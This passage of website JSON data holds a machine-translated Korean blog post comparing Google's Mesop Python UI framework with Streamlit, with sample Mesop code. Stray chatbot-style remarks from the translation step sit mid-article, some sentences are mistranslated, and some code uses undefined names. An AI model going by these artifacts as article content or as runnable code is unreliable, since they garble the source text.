제공함으로써 사용자 경험을 향상시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nReact Query를 다룬 이번 내용이 유익하고 실용적이었기를 바라요. React 애플리케이션을 최적화하는 더 많은 팁과 기술에 대한 소식을 기대해 주세요. 이 블로그가 유용하다면 공유하고 더 많은 콘텐츠를 구독해 주세요. 즐거운 코딩하세요!","ogImage":{"url":"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png"},"coverImage":"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png","tag":["Tech"],"readingTime":6},{"title":"구글이 Streamlit을 죽였는가","description":"","date":"2024-06-27 18:19","slug":"2024-06-27-DidGoogleJustKillStreamlit","content":"\n\n## 구글의 Mesop 프레임워크를 살펴보면 Streamlit보다 더 나은지 확인해보세요.\n\n내가 소파에 앉아 YouTube의 추천을 살펴보던 중 Google의 최신 오픈 소스 파이썬 프레임워크인 'Mesop'에 관한 Prompt Engineering의 비디오를 보게 되었습니다. 구글 팀이 내부 도구 및 빠른 프로토타이핑에 사용하는 'Mesop'라는 프레임워크입니다. 'Mesop'이 무엇을 의미하는지 궁금하다면, 너무 깊게 생각하지 마세요. 삶에는 모든 것이 의미가 있는 것은 아닙니다. 이 글을 읽는 Will이 있다면 아래 댓글에 남겨주세요.\n\n아마 Mesop을 시도해보고 Streamlit보다 실제로 더 나은지 확인해봐야겠다고 생각했습니다. Streamlit은 코드 작성 경험이 매우 직관적하고 마법 같이 순식간에 앱을 생성할 수 있는 능력 때문에 정말 좋아합니다. 하지만 그 인터페이스를 보자마자 Streamlit임을 알 수 있습니다.\n\n이 문제에 대처하기 위해 Python과 Tailwind CSS만 사용하여 아름다운 웹 앱을 개발하는 방법에 대해 작성한 블로그가 예상치 못하게 터져나왔습니다. 여기서 읽을 수 있습니다. 이 과정은 훨씬 더 제작 친화적이지만, 사용자 정의 가능한 프로토타입을 개발하려면 어떨까요?\n\n<div class=\"content-ad\"></div>\n\n당신이 바로 Mesop이 하는 일입니다.\n\n간략히 요약하면, Mesop은 아직 초기 단계에 있으므로 그것을 기반으로 SaaS 스타트업을 구축하기 위해 키보드로 코딩을 시작하지 마세요. 또한 Google에서 공식적으로 지원하지는 않습니다.\n\n# Mesop의 기능\n\n- 오픈 소스.\n- 미리 구축된 구성 요소로 시작하기 쉽습니다.\n- Python에서 작성된 자연스러운 코드.\n- 핫 리로드.\n- 구성 요소는 기본적으로 Python 함수입니다.\n- Angular로 구축되었습니다.\n\n<div class=\"content-ad\"></div>\n\n# Mesop 시작하기\n\n안녕하세요! 메소프 기술의 다양한 기능에 대한 장황한 문학작품으로 사람들을 지루하게 만드는 것을 싫어하기 때문에, 메소프로 기본 UI를 만드는 것으로 바로 도입하겠습니다. 메소프로 작업할 때 알아두어야 할 주요한 세 가지 구성 요소가 있습니다:\n\n- 상태 클래스: 이는 세션의 상태 역할을 하며 다른 구성 요소 간에 데이터를 공유하는 능력을 제공합니다.\n- 페이지 및 이벤트: 앱의 주요 UI입니다.\n- 스타일링 요소: CSS 스타일 (Tailwind 지원은 아직 제공되지 않습니다)\n\n시작하기 전에 pip install mesop을 사용해서 메소프를 설치해보세요. 함께 즐거운 개발 시간 보내시길 바랍니다!\n\n<div class=\"content-ad\"></div>\n\n## State 클래스\n\n앱 내에서 사용되는 모든 모델은 데코레이터 @me.stateclass를 사용하여 state 클래스를 인스턴스화하는 데 사용됩니다. 예를 들어, 제목과 개요를 사용하여 기사를 생성하는 GenAI 앱을 개발 중이라고 가정해보겠습니다. 'Article'이라는 이름의 state 클래스를 생성해야 합니다. 해당 state 클래스는 다음과 같이 보일 것입니다:\n\n```js\nimport mesop as me\n\n@me.stateclass\nclass Article:\n    title: str\n    outline: str\n    response: str\n```\n\n우리가 생성하는 각 함수나 구성 요소에서 이 state 클래스 데이터는 유지되며 전역적으로 액세스할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 페이지 및 이벤트\n\n모든 페이지는 Mesop에서 @me.page() 데코레이터를 사용하여 태그가 지정됩니다.\n\n```js\n@me.page()\ndef app():\n    me.input(label=\"제목\", type=\"text\")\n    me.input(label=\"개요\", type=\"text\")\n```\n\n위의 코드는 두 개의 입력 필드가 있는 기본 페이지를 생성합니다. 이전에 만든 상태 클래스에 데이터를 저장할 수 있도록 각 필드에는 별도의 함수가 필요합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\ndef on_title_input(title: me.InputEvent):\n    s = me.state(Article)\n    s.title = title.value\n\ndef on_outline_input(outline: me.InputEvent):\n    s = me.state(Article)\n    s.outline = outline.value\n\n@me.page()\ndef app():\n    me.input(label=\"Title\", on_input=on_title_input, type=\"text\")\n    me.input(label=\"Outline\", on_input=on_outline_input, type=\"text\")\r\n```\n\n상태 클래스에 액세스하려면 me.state() 함수를 사용합니다. 그 인스턴스는 변수 s에 저장됩니다.\n\nMesop에서 이벤트는 InputEvent, ClickEvent 등의 클래스를 사용하여 처리됩니다.\n\n클릭 이벤트를 처리하기 위해 다른 함수를 호출하여 입력 데이터를 제출할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n# 응답 스키마\nclass Blog(typing_extensions.TypedDict):\n    title: str\n    content: str\n\ndef on_title_input(title: me.InputEvent):\n    s = me.state(Article)\n    s.title = title.value\n\ndef on_outline_input(outline: me.InputEvent):\n    s = me.state(Article)\n    s.outline = outline.value\n\ndef on_click(click: me.ClickEvent):\n    s = me.state(Article)\n    prompt = f\"다음 기사 제목 및 개요를 사용하여 블로그를 작성해주세요: <article_title>{s.title}</article_title><article_outline>{s.outline}</article_outline>. 최종 블로그와 제목을 마크다운 형식으로 반환하세요.\"\n    # 훅 URL을 저장할 환경 변수 추가\n    response = model.generate_content(\n                prompt,\n                generation_config=genai.GenerationConfig(\n                    response_mime_type=\"application/json\",\n                    response_schema=Blog,\n                    temperature=0.8\n                ))\n    data = json.loads(response.text)\n    s.response = data\n\n@me.page()\ndef app():\n    me.input(label=\"제목\", on_input=on_title_input, type=\"text\")\n    me.input(label=\"개요\", on_input=on_outline_input, type=\"text\")\n    me.button(\"블로그 생성\", on_click=on_click)\r\n```\n\n재미있는 일을 위해 Mesop을 사용하여 Gemini 모델을 활용해 블로그를 생성할 것입니다. on_click 함수는 Article 인스턴스로부터 data s.title과 s.outline를 가져와서 만든 prompt에 주입할 것입니다. LLM의 응답은 블로그 내용을 담은 JSON일 것입니다.\n\n## 스타일링\n\nMesop에서 요소를 스타일링하는 것은 기존 CSS 속성과 유사하지만, 모든 속성은 me.style()의 매개변수입니다.\n\n\n<div class=\"content-ad\"></div>\n\nme.style()을 사용하여 스타일을 정의한 후, 해당 스타일을 변수에 저장하여 컴포넌트에서 매개변수로 호출할 수 있습니다.\n\n```js\n_STYLE_INPUT_WIDTH = me.Style(width=\"100%\")\n\n_STYLE_BUTTON = me.Style(\n    background=\"#1976D2\",\n    color=\"#fff\",\n    padding=me.Padding.symmetric(horizontal=20, vertical=10),\n    font_size=\"16px\",\n    cursor=\"pointer\",\n    margin=me.Margin(bottom=20),\n)\n\n@me.page()\ndef app():\n    with me.box(style=_STYLE_CONTAINER):\n        s = me.state(Article)\n        with me.box(style=_STYLE_MAIN_COLUMN):\n            me.input(label=\"Title\", on_input=on_title_input, type=\"text\", style=_STYLE_INPUT_WIDTH)\n            me.input(label=\"Outline\", on_input=on_outline_input, type=\"text\", style=_STYLE_INPUT_WIDTH)\n            me.button(\"Generate Blog\", on_click=on_click, style=_STYLE_BUTTON)\n    with me.box(style=_STYLE_PREVIEW_CONTAINER):\n        if s.response:\n            me.markdown(f\"{s.response['content']}\", style=_STYLE_PREVIEW)\n```\n\n# 최종 인터페이스\n\n<img src=\"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png\" />\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 테이블 태그를 마크다운 형식으로 변경해 드릴게요. \n\n\n| Not the best-looking UI, but that’s because I didn’t make the effort to style it enough. It still looks a lot better than raw HTML with just a few tweaks here and there. With the ability to use all CSS properties for the components, you can make the UI unique. |\n\n# Is Streamlit dead?\n\nNo, absolutely not. Mesop is still under development, and the documentation lacks in certain aspects. Deploying a Mesop application is not straightforward and requires containerization unless you are deploying it directly to Google Cloud.\n\nStreamlit still comes with its own set of benefits and is fundamentally stronger compared to Mesop, especially if you are looking to build something in the data visualization domain. Moreover, Streamlit Cloud is a boon for anyone looking to share their applications absolutely free of charge.\n\n\n무엇이든 더 도와드릴게요!\n\n<div class=\"content-ad\"></div>\n\n그러나 Mesop은 성장 잠재력이 있으며 매일 업데이트를 받고 있어 가벼운 성격으로 REST API에서 작동하는 빠른 도구 및 간단한 프로토 타입에 더 적합해지고 있습니다.\n\nMesop의 Will과 다른 기여자들에게 시간과 노력을 들여 이러한 프레임워크를 개발하고 유지하는 데 기쁨을 느낍니다.\n\n# 더 많은 UI 프레임워크가 필요합니다\n\nStreamlit, Nicegui, Gradio 그리고 이제 Mesop와 같은 새로운 Python UI 프레임워크가 등장하는 것을 항상 좋게 생각합니다. Python의 관용구 문법은 코딩을 훨씬 더 접근 가능하게 만들어주며, 이는 지금 Streamlit 프로젝트의 많은 수로부터 명확히 확인됩니다.\n\n<div class=\"content-ad\"></div>\n\n행운이던지 불행이던지, 파이썬이 내가 처음으로 배운 프로그래밍 언어였고, 그것에 즉시 사랑에 빠졌어요. 이와 같은 더 많은 프레임워크로 인해, Python은 사용량이 급격히 증가할 것이고, 미래에는 더 많은 실무급 Python 앱들을 볼 수 있기를 희망해요.\n\n저는 Mesop에 관한 이 짧은 블로그를 좋아해주셨으면 좋겠어요. 더 깊이 파고들고 싶었지만, 제한된 시간 때문에 글을 짧게 유지하게 된 것과, 우리 모두가 금붕어 수준의 집중력을 고려했기 때문이에요. 만약 이 글에 박수를 보내주시고, 파이썬과 Google 커뮤니티의 더 많은 사용자와 공유해주시고, 앞으로의 다른 글들을 위해 팔로우해주시면 정말 감사하겠어요.\n\n# 링크\n\n- Github\n- Mesop","ogImage":{"url":"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png"},"coverImage":"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png","tag":["Tech"],"readingTime":7}],"page":"2","totalPageCount":154,"totalPageGroupCount":8,"lastPageGroup":20,"currentPageGroup":0},"__N_SSG":true}